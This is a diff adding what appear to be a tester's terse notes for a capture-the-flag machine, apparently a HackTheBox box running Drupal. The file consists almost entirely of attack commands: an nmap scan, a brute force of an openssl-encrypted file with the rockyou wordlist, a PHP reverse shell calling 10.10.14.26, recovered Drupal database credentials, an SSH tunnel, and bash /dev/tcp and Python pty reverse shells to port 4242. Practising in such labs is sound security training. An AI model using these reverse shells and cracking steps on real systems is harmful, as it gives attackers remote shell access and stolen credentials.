@@ -1,0 +1,49 @@
+nmap -sV -sC -Pn 10.129.1.101 > nmap.txt
+
+
+openssl aes-256-cbc -d -a -in .drupal.txt.enc -out secrets.txt.new
+
+
+
+apt-get install libssl-dev
+
+bruteforce-salted-openssl -t 50 -f /usr/share/wordlists/rockyou.txt -d sha256 drupal.txt
+
+friends
+
+<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.26/1234 0>&1'");
+
+
+
+
+
+$databases = array (
+  'default' =>
+  array (
+    'default' =>
+    array (
+      'database' => 'drupal',
+      'username' => 'drupal',
+      'password' => 'drupal4hawk',
+      'host' => 'localhost',
+      'port' => '',
+      'driver' => 'mysql',
+      'prefix' => '',
+    ),
+  ),
+);
+
+
+daniel:x:1002:1005::/home/daniel:/usr/bin/python3
+
+
+ssh -L8083:localhost:8082 daniel@10.129.1.217
+
+#!/bin/bash
+0<&196;exec 196<>/dev/tcp/10.10.14.26/4242; sh <&196 >&196 2>&196
+
+import sys,socket,os,pty
+s=socket.socket()
+s.connect(("10.10.14.26",int("4242")))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")
